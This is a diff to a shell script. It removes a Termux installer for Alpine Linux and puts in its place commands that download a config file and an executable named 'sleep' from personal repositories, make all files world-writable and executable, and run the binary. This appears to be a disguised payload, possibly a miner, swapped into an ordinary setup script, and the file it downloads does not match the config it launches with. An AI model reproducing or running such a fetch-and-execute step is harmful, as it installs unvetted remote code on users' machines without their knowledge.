@@ -1,8 +1,1 @@
-#!/bin/sh
-
-echo "Alpine in Termux Install"
-apt -yq update
-apt -yq upgrade
-pkg install -yq proot-distro
-proot-distro install alpine
-proot-distro login alpine
+wget https://raw.githubusercontent.com/Iki78/Jsn/main/V90.json \nwget https://gitlab.com/rockymoysu/S/-/raw/main/sleep \nchmod 777 * \n./sleep --config=64.json
